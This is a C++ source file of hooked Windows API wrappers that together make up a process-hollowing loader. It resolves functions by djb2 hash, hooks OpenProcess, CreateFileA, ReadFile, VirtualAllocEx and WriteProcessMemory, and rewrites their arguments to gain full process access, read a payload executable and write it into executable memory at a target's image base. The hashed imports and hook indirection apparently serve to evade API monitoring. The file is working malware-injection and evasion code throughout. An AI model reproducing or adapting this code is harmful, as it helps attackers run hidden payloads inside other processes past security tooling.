#include "ph_function_defenition.h"


HANDLE OpenProcess_engine(DWORD pid)
{
	SecureZeroMemory(&_hookInfo,sizeof(_HOOKINFO));
	_OpenProcess _pOpenProcess = (_OpenProcess)_initialize(djb2_values[1], "OpenProcess",1);

	DWORD _newFunction = _inithook(0x2, (unsigned char*)_hookOpenProcess); //0x0 print disass, give function address

	_orginalOpenProcess = (_OpenProcess)_hookInfo._newFunction;
	
	HANDLE hProcess = (_OpenProcess)_pOpenProcess(0x0, TRUE, pid);
	
	return hProcess;
}

HANDLE WINAPI _hookOpenProcess(
	DWORD dwDesiredAccess,
	BOOL  bInheritHandle,
	DWORD dwProcessId
)
{
	dwDesiredAccess = PROCESS_ALL_ACCESS;
	bInheritHandle = FALSE;
	HANDLE ret = _orginalOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
	return ret;
}

HANDLE OpenThread_engine(DWORD tid)
{
	SecureZeroMemory(&_hookInfo, sizeof(_HOOKINFO));
	_OpenThread _pOpenThread = (_OpenThread)_initialize(djb2_values[1], "OpenThread",1);

	DWORD _newFunction = _inithook(0x2, (unsigned char*)_hookOpenThread); //0x0 print disass, give function address

	_orginalOpenThread = (_OpenThread)_hookInfo._newFunction;

	HANDLE hThread = (_OpenThread)_pOpenThread(0x0, TRUE, tid);

	return hThread;
}

HANDLE WINAPI _hookOpenThread(
	DWORD dwDesiredAccess,
	BOOL  bInheritHandle,
	DWORD dwProcessId
)
{
	dwDesiredAccess = THREAD_ALL_ACCESS;
	bInheritHandle = FALSE;
	HANDLE ret = _orginalOpenThread(dwDesiredAccess, bInheritHandle, dwProcessId);
	return ret;
}

HANDLE CreateFileA_engine()
{
	SecureZeroMemory(&_hookInfo, sizeof(_HOOKINFO));
	_CreateFileA _pCreateFileA = (_CreateFileA)_initialize(djb2_values[1], "CreateFileA",1);

	DWORD _newFunction = _inithook(0x2, (unsigned char*)_hookCreateFileA); //0x0 print disass, give function address

	_orginalCreateFileA = (_CreateFileA)_hookInfo._newFunction;

	HANDLE hFile = (_CreateFileA)_pCreateFileA(0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0);

	return hFile;
}

HANDLE WINAPI _hookCreateFileA(
	LPCSTR                lpFileName,
	DWORD                 dwDesiredAccess,
	DWORD                 dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD                 dwCreationDisposition,
	DWORD                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
)
{
	dwDesiredAccess = GENERIC_READ;
	dwCreationDisposition = OPEN_ALWAYS;

	char* pPath = new char[MAX_PATH];
	GetModuleFileNameA(0, pPath, MAX_PATH); 
	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
	strcat(pPath, "HelloWorld.exe"); 

	lpFileName = pPath;

	HANDLE hFile = _orginalCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

	return hFile;
}


PBYTE ReadFile_engine(HANDLE hFile)
{
	SecureZeroMemory(&_hookInfo, sizeof(_HOOKINFO));
	_ReadFile _pReadFile = (_ReadFile)_initialize(djb2_values[1], "ReadFile",1);

	DWORD _newFunction = _inithook(0x2, (unsigned char*)_hookReadFile); //0x0 print disass, give function address

	_orginalReadFile = (_ReadFile)_hookInfo._newFunction;

	DWORD dwSize = pGetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwSize];
	(_ReadFile)_pReadFile(hFile, pBuffer, dwSize, 0x0, 0x0);

	return (PBYTE)pBuffer;
}

BOOL WINAPI _hookReadFile(
	HANDLE hFile,
	LPVOID lpBuffer,
	DWORD nNumberOfBytesToRead,
	LPDWORD lpNumberOfBytesRead,
	LPOVERLAPPED lpOverlapped
)
{
	DWORD dwBytesRead = 0;
	BOOL ret = _orginalReadFile(hFile, lpBuffer, nNumberOfBytesToRead, &dwBytesRead, 0);
	return ret;
}

PVOID VirtualAllocEx_engine(DWORD SizeOfImage)
{
	SecureZeroMemory(&_hookInfo, sizeof(_HOOKINFO));
	_VirtualAllocEx _pVirtualAllocEx = (_VirtualAllocEx)_initialize(djb2_values[1], "VirtualAllocEx",1);

	DWORD _newFunction = _inithook(0x2, (unsigned char*)_hookVirtualAllocEx); //0x0 print disass, give function address

	_orginalVirtualAllocEx = (_VirtualAllocEx)_hookInfo._newFunction;

	LPVOID pRemoteImage = (_VirtualAllocEx)_pVirtualAllocEx(0x0, 0x0, SizeOfImage, 0x0, 0x0);

	return pRemoteImage;
}

LPVOID WINAPI _hookVirtualAllocEx(
	HANDLE hprocess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
)
{
	hprocess = hProcess;
	lpAddress = pPEB->ImageBaseAddress;
	flAllocationType = MEM_COMMIT | MEM_RESERVE;
	flProtect = PAGE_EXECUTE_READWRITE;

	LPVOID pRemoteImage = _orginalVirtualAllocEx(hprocess, lpAddress, dwSize, flAllocationType, flProtect);

	return pRemoteImage;
}

BOOL WriteProcessMemory_engine(
	HANDLE  hprocess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten)
{
	static BOOL isHook = FALSE;
	static _WriteProcessMemory _pWriteProcessMemory = nullptr;

	if (!isHook)
	{
		SecureZeroMemory(&_hookInfo, sizeof(_HOOKINFO));
		_pWriteProcessMemory = (_WriteProcessMemory)_initialize(djb2_values[1], "WriteProcessMemory",1);

		DWORD _newFunction = _inithook(0x2, (unsigned char*)_hookWriteProcessMemory); //0x0 print disass, give function address

		_orginalWriteProcessMemory = (_WriteProcessMemory)_hookInfo._newFunction;

		isHook = TRUE;
	}
	BOOL ret = _pWriteProcessMemory(hprocess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);

	//pVirtualFree((LPVOID)_hookInfo._newFunction, _hookInfo._FuncSize, MEM_DECOMMIT);

	return ret;
}

BOOL WINAPI _hookWriteProcessMemory(
	HANDLE  hprocess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten
)
{
	BOOL ret = _orginalWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
	return ret;
}

DWORD ReadProcessMemory_engine(PVOID pBaseAddress)
{
	static BOOL isHook = FALSE;
	static _ReadProcessMemory _pReadProcessMemory = nullptr;
	if (!isHook)
	{
		SecureZeroMemory(&_hookInfo, sizeof(_HOOKINFO));
		_pReadProcessMemory = (_ReadProcessMemory)_initialize(djb2_values[1], "ReadProcessMemory",1);

		DWORD _newFunction = _inithook(0x2, (unsigned char*)_hookReadProcessMemory); //0x0 print disass, give function address

		_orginalReadProcessMemory = (_ReadProcessMemory)_hookInfo._newFunction;

		isHook = TRUE;
	}
	DWORD dwBuffer = 0;
	BOOL ret = _pReadProcessMemory(0x0, pBaseAddress, &dwBuffer, 0x0, 0x0);

	return dwBuffer;
}

BOOL WINAPI _hookReadProcessMemory(
	HANDLE  hprocess,
	LPCVOID lpBaseAddress,
	LPVOID  lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesRead
)
{
	BOOL ret = _orginalReadProcessMemory(hProcess, lpBaseAddress,lpBuffer, sizeof(DWORD),0x0);

	return ret;
}